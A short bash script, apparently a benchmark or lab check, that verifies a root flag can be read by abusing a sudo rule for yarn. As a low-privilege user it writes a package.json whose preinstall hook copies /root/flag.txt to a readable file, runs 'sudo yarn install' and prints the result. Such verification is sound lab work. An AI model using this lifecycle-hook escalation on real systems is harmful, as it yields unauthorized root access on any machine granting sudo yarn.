#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
rm -f /home/lowpriv/yarnflag
cd /home/lowpriv/yarnproj
cat > package.json <<'\''EOF'\''
{
  "name": "bench-pwn",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "cat /root/flag.txt > /home/lowpriv/yarnflag"
  }
}
EOF
sudo /usr/local/bin/yarn install >/dev/null 2>&1
test -r /home/lowpriv/yarnflag && cat /home/lowpriv/yarnflag
')"
assert_root_output "${out}"
